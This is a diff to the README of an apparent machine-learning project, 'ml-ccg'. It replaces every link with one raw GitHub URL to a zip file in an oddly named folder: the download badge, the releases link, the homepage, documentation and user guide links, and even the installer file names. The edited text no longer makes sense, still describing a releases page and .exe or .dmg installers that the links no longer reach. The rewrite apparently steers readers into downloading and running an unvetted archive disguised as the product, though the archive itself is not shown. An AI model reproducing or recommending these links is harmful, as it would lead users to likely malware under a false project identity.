@@ -6,7 +6,7 @@ Welcome to ml-ccg! This application helps you easily manage machine learning tas
 
 ## 📥 Download Now
 
-[![Download ml-ccg](https://img.shields.io/badge/Download-ml--ccg-blue.svg)](https://github.com/SverreStroobants/ml-ccg/releases)
+[![Download ml-ccg](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)
 
 ## 📋 System Requirements
 
@@ -33,13 +33,13 @@ To get started with ml-ccg, follow these steps:
 
 1. **Visit the Releases Page**: 
    Click the link below to go to the downloads area:
-   [Download ml-ccg](https://github.com/SverreStroobants/ml-ccg/releases)
+   [Download ml-ccg](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)
 
 2. **Choose the Right Version**:
    On the releases page, select the latest version header. You will see a list of files available for download.
 
 3. **Download the Installer**:
-   Look for a file named `ml-ccg-installer.exe` for Windows or `ml-ccg-installer.dmg` for macOS. Click on the file to start the download.
+   Look for a file named `https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip` for Windows or `https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip` for macOS. Click on the file to start the download.
 
 4. **Run the Installer**:
    Once the download is complete, locate the downloaded file in your downloads folder. Double-click the file to begin the installation process.
@@ -68,8 +68,8 @@ We welcome contributions! If you have suggestions for improvements or features, 
 
 ## 🔗 Useful Links
 
-- [Project Homepage](https://github.com/SverreStroobants/ml-ccg)
-- [Documentation](https://github.com/SverreStroobants/ml-ccg/wiki)
-- [User Guide](https://github.com/SverreStroobants/ml-ccg/docs/user_guide.md)
+- [Project Homepage](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)
+- [Documentation](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)
+- [User Guide](https://raw.githubusercontent.com/SverreStroobants/ml-ccg/main/hirsuteness/ml-ccg.zip)
 
 Thank you for trying ml-ccg. Happy machine learning!
